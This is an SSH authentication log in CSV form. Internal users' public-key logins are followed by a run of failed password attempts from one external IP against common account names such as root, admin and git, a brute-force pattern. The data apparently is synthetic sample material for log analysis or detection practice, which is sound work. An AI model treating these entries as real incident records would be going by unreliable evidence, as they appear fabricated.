timestamp,source_ip,username,auth_method,result,message,port
2026-01-29 09:00:00,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",64299
2026-01-29 09:00:43,10.0.1.87,alice,publickey,SUCCESS,"Accepted publickey",62174
2026-01-29 09:02:07,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",41041
2026-01-29 09:02:49,10.0.1.87,alice,publickey,SUCCESS,"Accepted publickey",58390
2026-01-29 09:04:13,10.0.2.103,bob,publickey,SUCCESS,"Accepted publickey",54719
2026-01-29 09:04:28,10.0.1.87,dave,publickey,SUCCESS,"Accepted publickey",51149
2026-01-29 09:05:10,10.0.2.15,alice,publickey,SUCCESS,"Accepted publickey",43039
2026-01-29 09:06:10,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",41423
2026-01-29 09:07:33,10.0.1.42,dave,publickey,SUCCESS,"Accepted publickey",42582
2026-01-29 09:08:34,10.0.1.87,alice,publickey,SUCCESS,"Accepted publickey",41501
2026-01-29 09:09:26,10.0.1.42,bob,publickey,SUCCESS,"Accepted publickey",43309
2026-01-29 09:10:39,10.0.2.15,bob,publickey,SUCCESS,"Accepted publickey",52130
2026-01-29 09:11:28,10.0.1.42,bob,publickey,SUCCESS,"Accepted publickey",57502
2026-01-29 09:12:03,10.0.2.103,dave,publickey,FAILURE,"Connection closed by client",48845
2026-01-29 09:13:29,10.0.1.87,carol,publickey,SUCCESS,"Accepted publickey",41832
2026-01-29 09:13:48,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",48773
2026-01-29 09:15:15,10.0.2.15,bob,publickey,SUCCESS,"Accepted publickey",61477
2026-01-29 09:16:28,10.0.1.87,carol,publickey,SUCCESS,"Accepted publickey",44575
2026-01-29 09:17:54,10.0.2.15,dave,publickey,SUCCESS,"Accepted publickey",59121
2026-01-29 09:18:37,10.0.1.87,dave,publickey,SUCCESS,"Accepted publickey",42978
2026-01-29 09:19:06,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",62298
2026-01-29 09:19:29,10.0.2.103,dave,publickey,FAILURE,"Connection closed by client",59526
2026-01-29 09:20:51,10.0.2.15,alice,publickey,SUCCESS,"Accepted publickey",62291
2026-01-29 09:22:14,10.0.2.15,carol,publickey,SUCCESS,"Accepted publickey",43655
2026-01-29 09:22:49,10.0.2.103,alice,publickey,SUCCESS,"Accepted publickey",63661
2026-01-29 09:23:37,10.0.1.87,alice,publickey,SUCCESS,"Accepted publickey",60489
2026-01-29 09:24:56,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",52252
2026-01-29 09:26:20,10.0.1.42,carol,publickey,SUCCESS,"Accepted publickey",56010
2026-01-29 09:27:21,10.0.2.15,bob,publickey,SUCCESS,"Accepted publickey",41898
2026-01-29 09:28:48,10.0.1.42,alice,publickey,SUCCESS,"Accepted publickey",63983
2026-01-29 09:29:11,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",61618
2026-01-29 09:30:36,10.0.1.87,carol,publickey,SUCCESS,"Accepted publickey",57290
2026-01-29 09:31:45,10.0.1.87,bob,publickey,SUCCESS,"Accepted publickey",63361
2026-01-29 09:32:47,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",43965
2026-01-29 09:33:10,10.0.2.15,alice,publickey,SUCCESS,"Accepted publickey",59277
2026-01-29 10:15:00,185.220.101.47,test,password,FAILURE,"Failed password",30471
2026-01-29 10:15:02,185.220.101.47,admin,password,FAILURE,"Failed password",45003
2026-01-29 10:15:04,185.220.101.47,admin,password,FAILURE,"Failed password",51654
2026-01-29 10:15:06,185.220.101.47,test,password,FAILURE,"Failed password",48250
2026-01-29 10:15:13,185.220.101.47,deploy,password,FAILURE,"Failed password",44040
2026-01-29 10:15:19,185.220.101.47,ubuntu,password,FAILURE,"Failed password",60976
2026-01-29 10:15:22,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",46239
2026-01-29 10:15:48,185.220.101.47,root,password,FAILURE,"Failed password",58249
2026-01-29 10:15:52,185.220.101.47,git,password,FAILURE,"Failed password",56941
2026-01-29 10:15:57,185.220.101.47,admin,password,FAILURE,"Failed password",36449
2026-01-29 10:15:59,185.220.101.47,git,password,FAILURE,"Failed password",52236
2026-01-29 10:16:07,185.220.101.47,root,password,FAILURE,"Failed password",46295
2026-01-29 10:16:10,185.220.101.47,test,password,FAILURE,"Failed password",59400
2026-01-29 10:16:13,185.220.101.47,git,password,FAILURE,"Failed password",42025
2026-01-29 10:16:17,185.220.101.47,deploy,password,FAILURE,"Failed password",46371
2026-01-29 10:16:25,185.220.101.47,root,password,FAILURE,"Failed password",59041
2026-01-29 10:16:33,185.220.101.47,root,password,FAILURE,"Failed password",33315
2026-01-29 10:16:40,185.220.101.47,admin,password,FAILURE,"Failed password",36112
2026-01-29 10:16:48,185.220.101.47,test,password,FAILURE,"Failed password",40899
2026-01-29 10:16:53,10.0.2.103,dave,publickey,SUCCESS,"Accepted publickey",47004
2026-01-29 10:17:38,185.220.101.47,admin,password,FAILURE,"Failed password",40789
2026-01-29 10:17:43,185.220.101.47,admin,password,FAILURE,"Failed password",55586
2026-01-29 10:17:47,185.220.101.47,deploy,password,FAILURE,"Failed password",48694
2026-01-29 10:17:52,185.220.101.47,deploy,password,FAILURE,"Failed password",40144
2026-01-29 10:17:55,185.220.101.47,postgres,password,FAILURE,"Failed password",44267
2026-01-29 10:17:57,185.220.101.47,admin,password,FAILURE,"Failed password",50552
